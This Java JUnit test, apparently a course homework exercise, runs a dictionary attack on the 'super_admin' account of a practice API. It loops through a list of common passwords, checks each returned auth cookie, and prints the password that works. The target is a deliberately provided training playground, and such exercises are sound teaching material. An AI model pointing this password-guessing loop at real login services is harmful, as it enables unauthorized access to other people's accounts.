import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Ex9Test {

    @Test
    public void test() {
        Map<String, String> data = new HashMap<>();
        String login = "super_admin";
        String[] pass = new String[]{"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
                "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
                "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"};

        for (String s : pass) {
            data.put("login", login);
            data.put("password", s);
            String responseCookie = get_secret_password_homework(data);
            if (responseCookie == null) {
                Assertions.fail("Login is invalid!");
            }
            String answer = check_auth_cookie(responseCookie, data);
            if (!answer.equals("You are NOT authorized")) {
                System.out.println("Password: " + data.get("password") + "\nAnswer: " + answer);
                break;
            }
        }
    }

    public String get_secret_password_homework(Map<String, String> data) {
        Response response = RestAssured
                .given()
                .body(data)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        if (response.getStatusCode() == 500) {
            return null;
        } else {
            return response.getCookie("auth_cookie");
        }
    }

    public String check_auth_cookie(String cookie, Map<String, String> data) {
        Map<String, String> cookies = new HashMap<>();
        cookies.put("auth_cookie", cookie);
        Response response = RestAssured
                .given()
                .body(data)
                .cookies(cookies)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        return response.asString();
    }
}
